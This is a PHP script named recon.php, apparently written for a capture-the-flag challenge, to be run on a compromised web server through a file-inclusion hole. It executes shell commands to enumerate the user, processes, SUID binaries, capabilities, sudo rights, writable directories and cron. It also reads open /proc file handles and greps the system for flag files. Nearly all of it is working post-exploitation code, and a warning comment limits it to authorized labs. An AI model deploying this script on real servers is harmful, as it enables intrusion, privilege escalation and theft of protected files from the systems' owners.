<?php
// recon.php
// Ejecuta un conjunto de comandos informativos para LFI/RFI CTF recon.
// WARNING: Use only in authorized/lab/CTF environments.

function run($cmd) {
    $out = null;
    $ret = null;
    exec($cmd . " 2>&1", $out, $ret);
    return implode("\n", $out);
}

$sections = [];

// Basic context
$sections[] = "[whoami]\n" . run("whoami");
$sections[] = "[id]\n" . run("id");
$sections[] = "[uname]\n" . run("uname -a");
$sections[] = "[ps sample]\n" . run("ps -eo user,uid,gid,comm --sort=-uid | head -n 50");

// /flag info
$sections[] = "[ls /flag]\n" . run("ls -la /flag 2>/dev/null || echo 'ls /flag failed or no permission'");
$sections[] = "[ls /flag/*/flag.txt]\n" . run("ls -la /flag/*/flag.txt 2>/dev/null || echo 'no direct listing or permission denied'");
$sections[] = "[stat flags]\n" . run("stat -c '%U %G %a %n' /flag/*/flag.txt 2>/dev/null || echo 'stat failed'");

// ACLs
$sections[] = "[getfacl /flag/*/flag.txt]\n" . run("getfacl /flag/*/flag.txt 2>/dev/null || echo 'getfacl not available or no access'");

// Check /proc fds for open handles to /flag
$proc_scan = [];
$proc_scan[] = "Scanning /proc/*/fd for references to /flag ...";
foreach (glob("/proc/*/fd/*", GLOB_BRACE) as $fdpath) {
    $target = @readlink($fdpath);
    if ($target && strpos($target, '/flag/') !== false) {
        $proc_scan[] = "$fdpath -> $target";
        // try to cat the fd (best-effort, quiet on error)
        $content = @file_get_contents($fdpath);
        if ($content !== false && strlen(trim($content)) > 0) {
            $snippet = substr($content, 0, 4096);
            $proc_scan[] = "----- content snippet (first 4k) -----\n" . $snippet . "\n----- end snippet -----";
        } else {
            $proc_scan[] = "Could not read fd content or empty";
        }
    }
}
if (count($proc_scan) == 1) $proc_scan[] = "No /proc/*/fd references to /flag found or permission denied";
$sections[] = "[/proc fd scan]\n" . implode("\n", $proc_scan);

// Search for other flag copies (readable)
$sections[] = "[find: other flag.txt readable copies]\n" . run("find / -xdev -type f -name 'flag.txt' -perm -o=r -ls 2>/dev/null | head -n 200");

// Grep common locations quickly for the flag hash or pattern (adjust the hash if needed)
$sections[] = "[grep: possible flag tokens in /var/www /var /home /tmp]\n" . run("grep -R --line-number --binary-files=without-match -I 'FLAG\\|Flag\\|flag\\|0528026a9109f91adde76ff8375df9dc' /var/www /var /home /tmp 2>/dev/null | head -n 200");

// SUID & capabilities
$sections[] = "[SUID files (top results)]\n" . run("find / -xdev -perm -4000 -type f 2>/dev/null -ls | head -n 200");
$sections[] = "[file capabilities]\n" . run("getcap -r / 2>/dev/null || echo 'getcap not present or no caps'");

// sudo (if available)
$sudo = run("sudo -l 2>&1");
$sections[] = "[sudo -l]\n" . ($sudo ? $sudo : "sudo not available or you cannot run it");

// Check common logs
$sections[] = "[ls /var/log]\n" . run("ls -la /var/log 2>/dev/null | head -n 200");
$sections[] = "[grep: 'flag' in logs /tmp recent]\n" . run("grep -R --line-number --binary-files=without-match -I 'flag\\|FLAG' /var/log /tmp /var/tmp 2>/dev/null | head -n 200");

// Check writable dirs and cron
$sections[] = "[writable dirs (some)]\n" . run("find / -xdev -writable -type d 2>/dev/null | head -n 200");
$sections[] = "[cron dirs]\n" . run("ls -la /etc/cron.* /etc/cron.d 2>/dev/null || echo 'cron dirs not accessible'");

// Output everything
header('Content-Type: text/plain; charset=utf-8');
echo "=== RECON REPORT ===\n\n";
foreach ($sections as $s) {
    echo $s . "\n\n";
}
echo "=== END REPORT ===\n";
